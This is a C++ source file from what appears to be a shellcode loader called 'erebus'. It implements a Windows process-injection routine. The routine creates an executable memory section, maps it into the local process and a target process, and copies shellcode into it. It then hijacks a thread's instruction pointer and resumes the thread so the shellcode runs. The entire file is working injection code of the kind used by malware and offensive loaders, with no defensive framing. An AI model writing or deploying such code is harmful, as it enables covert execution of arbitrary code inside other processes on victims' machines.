#include "../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 2
	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via. NtMapViewOfSection");

		HANDLE section_handle;
		LARGE_INTEGER section_size = { shellcode_size };

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");

		NTSTATUS status = NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to create section (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Section created");

		// Map to local process for writing
		PVOID local_address = NULL;
		SIZE_T local_view_size = shellcode_size;

		status = NtMapViewOfSection(
			section_handle,
			NtCurrentProcess(),
			&local_address,
			NULL,
			NULL,
			NULL,
			&local_view_size,
			(SECTION_INHERIT)ViewShare,
			NULL,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to map view to local process (NTSTATUS: 0x%08X)", status);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Mapped to local process at: 0x%08pX", local_address);

		// Copy shellcode to mapped section
		RtlCopyMemory(local_address, shellcode, shellcode_size);
		LOG_SUCCESS("Shellcode copied to section");

		// Map to remote process for execution
		PVOID remote_address = NULL;
		SIZE_T remote_view_size = shellcode_size;

		status = NtMapViewOfSection(
			section_handle,
			process_handle,
			&remote_address,
			NULL,
			NULL,
			NULL,
			&remote_view_size,
			(SECTION_INHERIT)ViewShare,
			NULL,
			PAGE_EXECUTE_READ
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to map view to remote process (NTSTATUS: 0x%08X)", status);
			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Mapped to remote process at: 0x%08pX", remote_address);

		// Get thread context and hijack RIP
		LPCONTEXT context_ptr = new CONTEXT();
		context_ptr->ContextFlags = CONTEXT_FULL;
		
		if (!GetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to get thread context (Code: 0x%08lX)", GetLastError());
			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		// Hijack instruction pointer to shellcode
#ifdef _WIN64
		context_ptr->Rip = (DWORD64)remote_address;
#else
		context_ptr->Eip = (DWORD)remote_address;
#endif

		if (!SetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to set thread context (Code: 0x%08lX)", GetLastError());
			delete context_ptr;
			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Thread context hijacked to: 0x%08pX", remote_address);

		delete context_ptr;

		// Resume thread to execute shellcode
		status = NtResumeThread(thread_handle, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
		}
		else {
			LOG_SUCCESS("Thread resumed, shellcode executing");
		}

		// Cleanup local mapping
		NtUnmapViewOfSection(NtCurrentProcess(), local_address);
		NtClose(section_handle);
		NtClose(process_handle);
		NtClose(thread_handle);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
